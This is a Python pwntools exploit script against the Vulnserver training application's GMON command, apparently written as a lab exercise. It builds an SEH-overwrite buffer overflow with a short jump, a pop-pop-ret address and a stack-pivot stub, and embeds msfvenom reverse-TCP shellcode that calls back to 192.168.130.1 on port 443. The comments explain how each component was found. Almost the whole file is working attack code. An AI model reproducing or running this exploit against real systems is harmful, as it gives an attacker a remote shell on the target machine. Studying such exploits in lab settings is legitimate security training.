#!/usr/bin/python
from pwn import *


host = "192.168.130.156"     # Windows VM
port = 9999                 # Vulnserver port

#badchars = "0x00"


#PPR address => 625010B4

#replace nextSEH address by code saying jump to next DDDD. Since there's jump code is 2 bits and
#there is 4 bits of code before reaching the DDDD, we gonna jump 6 bits 
#then code is eb 0x6 => \0xeb\0x06, we need to add 2 nop code to make it 4 bits then it becomes \xeb\x06
#And since nextSEH should be entered in reverse order, it becomes p32(0x909006eb)

#nextSEH = p32(0x06eb9090)
nextSEH = p32(0x909006eb)

#find "pop pop ret" address in mona with "!mona seh" and enter that value in SEH
SEH = p32(0x6250172B)

#shellcode generation
#msfvenom -p windows/shell_reverse_tcp lhost=192.168.130.1 lport=443 -f c EXINTFUNC=thread -b '\x00'

shellcode = ("\xbd\x1f\xd6\xc8\x8e\xd9\xd0\xd9\x74\x24\xf4\x5a\x31\xc9\xb1"
"\x52\x31\x6a\x12\x03\x6a\x12\x83\xdd\xd2\x2a\x7b\x1d\x32\x28"
"\x84\xdd\xc3\x4d\x0c\x38\xf2\x4d\x6a\x49\xa5\x7d\xf8\x1f\x4a"
"\xf5\xac\x8b\xd9\x7b\x79\xbc\x6a\x31\x5f\xf3\x6b\x6a\xa3\x92"
"\xef\x71\xf0\x74\xd1\xb9\x05\x75\x16\xa7\xe4\x27\xcf\xa3\x5b"
"\xd7\x64\xf9\x67\x5c\x36\xef\xef\x81\x8f\x0e\xc1\x14\x9b\x48"
"\xc1\x97\x48\xe1\x48\x8f\x8d\xcc\x03\x24\x65\xba\x95\xec\xb7"
"\x43\x39\xd1\x77\xb6\x43\x16\xbf\x29\x36\x6e\xc3\xd4\x41\xb5"
"\xb9\x02\xc7\x2d\x19\xc0\x7f\x89\x9b\x05\x19\x5a\x97\xe2\x6d"
"\x04\xb4\xf5\xa2\x3f\xc0\x7e\x45\xef\x40\xc4\x62\x2b\x08\x9e"
"\x0b\x6a\xf4\x71\x33\x6c\x57\x2d\x91\xe7\x7a\x3a\xa8\xaa\x12"
"\x8f\x81\x54\xe3\x87\x92\x27\xd1\x08\x09\xaf\x59\xc0\x97\x28"
"\x9d\xfb\x60\xa6\x60\x04\x91\xef\xa6\x50\xc1\x87\x0f\xd9\x8a"
"\x57\xaf\x0c\x1c\x07\x1f\xff\xdd\xf7\xdf\xaf\xb5\x1d\xd0\x90"
"\xa6\x1e\x3a\xb9\x4d\xe5\xad\x06\x39\x67\x2c\xef\x38\x67\x2e"
"\x54\xb5\x81\x5a\xba\x90\x1a\xf3\x23\xb9\xd0\x62\xab\x17\x9d"
"\xa5\x27\x94\x62\x6b\xc0\xd1\x70\x1c\x20\xac\x2a\x8b\x3f\x1a"
"\x42\x57\xad\xc1\x92\x1e\xce\x5d\xc5\x77\x20\x94\x83\x65\x1b"
"\x0e\xb1\x77\xfd\x69\x71\xac\x3e\x77\x78\x21\x7a\x53\x6a\xff"
"\x83\xdf\xde\xaf\xd5\x89\x88\x09\x8c\x7b\x62\xc0\x63\xd2\xe2"
"\x95\x4f\xe5\x74\x9a\x85\x93\x98\x2b\x70\xe2\xa7\x84\x14\xe2"
"\xd0\xf8\x84\x0d\x0b\xb9\xb5\x47\x11\xe8\x5d\x0e\xc0\xa8\x03"
"\xb1\x3f\xee\x3d\x32\xb5\x8f\xb9\x2a\xbc\x8a\x86\xec\x2d\xe7"
"\x97\x98\x51\x54\x97\x88")


buffer = "\x90" * 10
buffer += shellcode
buffer += 'A' * (3546 - len(buffer))
buffer += nextSEH
buffer += SEH

#Now we need to calculate how many bits we need to reach the start of the AAAA sent first
#Done by address_of_current_esp - address_of_first_aaaa
#address_of_current_esp is the address when the short jump is called with eb 06 90 90
#address_of_first_aaaa can be found by looking for GMON /../ in "String binary" search of immunity

#/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb
#push esp
#pop eax 
#add ax, 0x566
#jmp eax

#easily found with "/x54/58/x66/x05" hex_value_to_add_in_rev_order "/xFF/xEO"
#Ex: 0x566 => 0x0566 => /x66/x05 Final code=> "/x54/58/x66/x05/ x66/x05 /xFF/xEO"


#And grab the whole code and place it in staged_code  (DDDD is just to confirm if buffer is the first)
#\x54\x58\x66\x05\xDD\xD0\xFF\xE0
#staged_code = "DDDD"

buffer += "\x54\x58\x66\x05\x66\x05\xFF\xE0"
buffer += 'E' * (5012 - len(buffer))

conn = remote(host, port)   # pwntools way to connect to host
conn.recvline()             # receive connection to host

conn.send("GMON /.../" + buffer)     # send evil buffer

conn.close()                        # Close connection if not hung
